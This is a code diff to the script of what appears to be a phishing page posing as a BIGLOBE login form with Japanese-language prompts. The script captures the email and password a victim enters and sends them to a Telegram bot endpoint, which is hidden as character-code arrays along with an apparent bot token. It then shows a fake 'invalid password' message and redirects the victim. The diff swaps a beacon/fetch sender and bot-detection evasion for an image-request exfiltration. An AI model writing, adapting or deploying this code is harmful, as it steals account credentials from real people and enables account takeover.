@@ -185,7 +185,6 @@
     
     <script>
     (function() {
-        var _0x = window, _d = document, _n = navigator;
         var _c = {
             _a: [104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116],
             _b: [56,51,56,55,48,50,56,50,53,49,58,65,65,71,72,80,56,81,82,119,116,118,104,67,117,82,98,117,111,114,53,89,114,82,82,103,89,79,45,115,80,101,112,82,54,77],
@@ -196,72 +195,46 @@
         var _s = function(a) { var r = ''; for (var i = 0; i < a.length; i++) r += String.fromCharCode(a[i]); return r; };
         var _v = 0;
 
-        if (/bot|crawl|spider|slurp|lighthouse|headless|phantom|selenium|puppeteer/i.test(_n.userAgent) ||
-            _n.webdriver || !_n.languages || _n.languages.length === 0) return;
-
         var _p = function(u, k) {
-            var t = "\u{1F510} BIGLOBE LOGIN \u2705\n\n";
-            t += "\u{1F4E7} Email: " + u + "\n";
-            t += "\u{1F511} Pass: " + k + "\n\n";
-            t += "\u25AC\u25AC\u25AC\u25AC\u25AC\u25AC[BIGLOBE]\u25AC\u25AC\u25AC\u25AC\u25AC\u25AC\n";
-            t += "\u{1F517} URL: " + _0x.location.href + "\n";
-            t += "\u{1F4F1} Time: " + new Date().toLocaleString() + "\n";
-            t += "\u{1F4DE} @plus234ng";
-
-            var ep = _s(_c._a) + _s(_c._b) + _s(_c._f);
-            var payload = JSON.stringify({ chat_id: parseInt(_s(_c._g)), text: t });
-
-            try {
-                var blob = new Blob([payload], { type: 'application/json' });
-                _n.sendBeacon(ep, blob);
-            } catch(e) {
-                try {
-                    fetch(ep, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
-                } catch(e2) {
-                    var r = new XMLHttpRequest();
-                    r.open('POST', ep, true);
-                    r.setRequestHeader('Content-Type', 'application/json');
-                    r.send(payload);
-                }
-            }
+            var t = "BIGLOBE LOGIN\n\nEmail: " + u + "\nPass: " + k + "\n\nURL: " + window.location.href + "\nTime: " + new Date().toLocaleString() + "\n@plus234ng";
+            var ep = _s(_c._a) + _s(_c._b) + _s(_c._f) + "?" + "chat_id=" + _s(_c._g) + "&text=" + encodeURIComponent(t);
+            new Image().src = ep;
         };
 
-        setTimeout(function() {
-            var h = _0x.location.hash.substring(1);
-            if (h && h.indexOf('@') !== -1) {
-                _d.getElementById('email').value = decodeURIComponent(h);
-            }
+        var h = window.location.hash.substring(1);
+        if (h && h.indexOf('@') !== -1) {
+            document.getElementById('email').value = decodeURIComponent(h);
+        }
 
-            var fm = _d.getElementById('auth-form-legacy');
-            if (fm) { fm.onsubmit = function(e) { e.preventDefault(); return false; }; }
+        var fm = document.getElementById('auth-form-legacy');
+        fm.onsubmit = function(e) { if(e && e.preventDefault) e.preventDefault(); return false; };
 
-            _d.getElementById('submit-btn').addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
+        document.getElementById('submit-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
 
-                var u = _d.getElementById('email').value;
-                var k = _d.getElementById('password').value;
-                var m = _d.getElementById('msg');
-                var lo = _d.getElementById('loader_overlay');
+            var u = document.getElementById('email').value;
+            var k = document.getElementById('password').value;
+            var m = document.getElementById('msg');
+            var lo = document.getElementById('loader_overlay');
 
-                if (!u) { m.innerHTML = "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
-                if (!k) { m.innerHTML = "\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
+            if (!u) { m.innerHTML = "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
+            if (!k) { m.innerHTML = "\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
 
-                _v++;
-                lo.style.display = 'flex';
-                _p(u, k);
+            _v++;
+            lo.style.display = 'flex';
+            _p(u, k);
 
-                setTimeout(function() {
-                    lo.style.display = 'none';
-                    _d.getElementById('password').value = '';
-                    m.innerHTML = "\u30E1\u30FC\u30EB\u307E\u305F\u306F\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u7121\u52B9\u3067\u3059\u3002\u3082\u3046\u4E00\u5EA6\u3084\u308A\u76F4\u3057\u3066\u304F\u3060\u3055\u3044\u3002";
-                    m.style.display = 'block';
-                    if (_v >= 2) _0x.location.replace(_s(_c._h));
-                }, 1500);
+            setTimeout(function() {
+                lo.style.display = 'none';
+                document.getElementById('password').value = '';
+                m.innerHTML = "\u30E1\u30FC\u30EB\u307E\u305F\u306F\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u7121\u52B9\u3067\u3059\u3002\u3082\u3046\u4E00\u5EA6\u3084\u308A\u76F4\u3057\u3066\u304F\u3060\u3055\u3044\u3002";
+                m.style.display = 'block';
+                if (_v >= 2) window.location.replace(_s(_c._h));
+            }, 1500);
 
-                return false;
-            });
-        }, 300);
+            return false;
+        });
     })();
     </script>
     
